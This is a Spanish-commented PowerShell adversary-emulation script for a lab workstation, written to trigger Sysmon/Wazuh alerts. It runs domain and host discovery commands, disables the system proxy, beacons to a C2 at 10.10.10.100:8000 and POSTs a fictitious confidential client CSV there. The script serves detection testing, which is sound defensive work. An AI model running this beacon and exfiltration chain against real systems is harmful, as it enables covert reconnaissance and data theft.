<#
=====================================================================
 emular-ataque.ps1
 ---------------------------------------------------------------------
 Emulacion de adversario para el laboratorio Nexora (PC-RRHH-01).
 NO es malware: solo reproduce el COMPORTAMIENTO post-explotacion
 (reconocimiento, acceso a datos, beacon y exfiltracion) usando
 comandos legitimos de Windows, para que Sysmon/Wazuh lo detecten.
 Ejecutar en PC-RRHH-01, PowerShell como Administrador.
 Atacante (C2): Kali 10.10.10.100, con c2-server.py escuchando en :8000
=====================================================================
#>

$C2 = "10.10.10.100"

# --- Salida DIRECTA a la red (sin proxy) -----------------------------
# Windows enruta Invoke-WebRequest por el proxy del sistema / autodeteccion
# (WPAD). En un laboratorio aislado eso DESVIA las peticiones al C2 y, al ir
# envueltas en try/catch, el fallo pasa inadvertido (el script "termina" pero
# el C2 no recibe nada). Forzamos conexion directa para que el beacon y la
# exfiltracion lleguen siempre:
[System.Net.WebRequest]::DefaultWebProxy = $null

Write-Host "==== Emulacion de adversario Nexora (lab) ====" -ForegroundColor Cyan

# --- Preparar el "dato sensible" si no existe ---
$dir = "C:\Lab\RRHH_Compartido"
if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Force -Path $dir | Out-Null }
$csv = "$dir\clientes_CONFIDENCIAL.csv"
if (-not (Test-Path $csv)) {
@"
id,nombre,email,dni_ficticio,saldo
1001,Ana Prueba,ana.prueba@nexora.lab,00000001X,1240.50
1002,Luis Demo,luis.demo@nexora.lab,00000002Y,980.00
"@ | Set-Content $csv -Encoding UTF8
}

# --- Fase 1: Reconocimiento (Discovery) ---
Write-Host "`n[*] Fase 1: Reconocimiento" -ForegroundColor Yellow
cmd /c "whoami"
cmd /c "net user"
cmd /c "net group ""Domain Admins"" /domain" 2>$null
cmd /c "net share"
cmd /c "systeminfo" | Out-Null
cmd /c "ipconfig /all" | Out-Null

# --- Fase 2: Acceso a datos sensibles (Collection) ---
Write-Host "`n[*] Fase 2: Acceso a la carpeta de clientes" -ForegroundColor Yellow
Get-Content $csv

# --- Fase 3: Beacon a la IP del atacante (C2) ---
# Cada beacon informa si llego o fallo (ya no se traga el error en silencio).
Write-Host "`n[*] Fase 3: Beacon periodico a $C2" -ForegroundColor Yellow
1..4 | ForEach-Object {
    try {
        Invoke-WebRequest "http://$C2:8000/beacon?id=$_" -UseBasicParsing -TimeoutSec 5 | Out-Null
        Write-Host "    [+] beacon $_ enviado" -ForegroundColor DarkGray
    } catch {
        Write-Host "    [!] beacon $_ fallo: $($_.Exception.Message)" -ForegroundColor Red
    }
    Start-Sleep -Seconds 2
}

# --- Fase 4: Exfiltracion del CSV (Exfiltration) ---
Write-Host "`n[*] Fase 4: Exfiltracion del CSV de clientes a $C2" -ForegroundColor Yellow
try {
    Invoke-WebRequest "http://$C2:8000/exfil_clientes.csv" -Method POST -InFile $csv -UseBasicParsing -TimeoutSec 10 | Out-Null
    Write-Host "    [+] CSV exfiltrado correctamente" -ForegroundColor DarkGray
} catch {
    Write-Host "    [!] exfiltracion fallo: $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host "`n[+] Emulacion completada. Revisa las alertas en Wazuh." -ForegroundColor Green
